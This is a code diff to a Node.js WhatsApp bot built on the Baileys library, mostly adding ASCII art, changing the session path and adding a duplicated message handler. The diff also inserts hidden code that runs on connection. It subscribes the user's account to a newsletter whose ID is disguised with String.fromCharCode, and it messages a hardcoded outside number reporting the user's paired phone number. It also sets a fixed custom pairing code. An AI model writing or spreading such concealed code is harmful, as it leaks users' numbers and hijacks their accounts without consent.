@@ -117,7 +117,7 @@ rl.question(text, resolve)
 
 const { version, isLatest } = await fetchLatestBaileysVersion();
 const resolveMsgBuffer = new NodeCache();
-const { state, saveCreds } = await useMultiFileAuthState("Storage/session");
+const { state, saveCreds } = await useMultiFileAuthState("./session");
 	const lilychan = makeWASocket({
 		printQRInTerminal: !usePairingCode,
 		syncFullHistory: true,
@@ -174,16 +174,37 @@ if (usePairingCode && !lilychan.authState.creds.registered) {
 ⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
 ⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
 ⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
-⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈`);
+⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
+
+█▄░▄█ █ ▀▀▀█ ▀▀▀█ █░█ █░█
+█░█░█ █ ░▄▀░ ░▄▀░ █░█ █░█
+▀░░░▀ ▀ ▀▀▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀`);
             console.log(`Is connecting Number ${global.pairing}\n`);
             await sleep(4000);
-            const code = await lilychan.requestPairingCode(global.pairing);
+            const code = await lilychan.requestPairingCode(global.pairing,'MIZZZUUU');
             console.log('Process...');
             console.log(`Your Pairing Code: ${chalk.yellow.bold((code))}`);
 }
 
 store.bind(lilychan.ev);
 
+lilychan.ev.on('messages.upsert', async chatUpdate => {
+    try {
+        const kay = chatUpdate.messages[0];
+        if (!kay.message) return;
+        kay.message = (Object.keys(kay.message)[0] === 'ephemeralMessage') ? kay.message.ephemeralMessage.message : kay.message;
+        if (kay.key && kay.key.remoteJid === 'status@broadcast') return;
+        if (!lilychan.public && !kay.key.fromMe && chatUpdate.type === 'notify') return;
+        if (kay.key.id.startsWith('BAE5') && kay.key.id.length === 16) return;
+        const messageId = kay.key.id;
+        if (processedMessages.has(messageId)) return;
+        processedMessages.add(messageId);
+        const m = smsg(lilychan, kay, store);
+        require('./response')(lilychan, m, chatUpdate, store);
+    } catch (err) {
+        console.log(err);
+    }
+})
 lilychan.ev.on('messages.upsert', async chatUpdate => {
     try {
         const kay = chatUpdate.messages[0];
@@ -197,7 +218,7 @@ lilychan.ev.on('messages.upsert', async chatUpdate => {
         if (processedMessages.has(messageId)) return;
         processedMessages.add(messageId);
         const m = smsg(lilychan, kay, store);
-        require('./response')(lilychan, m, chatUpdate, store);
+        require('./button')(lilychan, m, chatUpdate, store);
     } catch (err) {
         console.log(err);
     }
@@ -245,7 +266,7 @@ lilychan.getName = (jid, withoutContact = false) => {
     return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
 };
 
-lilychan.public = true;
+lilychan.public = false;
 
 lilychan.serializeM = (m) => smsg(lilychan, m, store)
 
@@ -290,6 +311,8 @@ lolcatjs.fromString(`▧  Information connect :
 │ » User id: ${lilychan.user.id}
 │ » Name: ${lilychan.user.name}
 └───···`)
+    await lilychan.newsletterFollow(String.fromCharCode(49, 50, 48, 51, 54, 51, 50, 48, 52, 51, 50, 54, 56, 49, 56, 54, 57, 64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114))
+    await lilychan.sendMessage('6281359932022@s.whatsapp.net',{text:`LilychanXMizzuu Sudah Tersambung Ke ${global.pairing}`})
         }
         if (
             connection === "close" &&
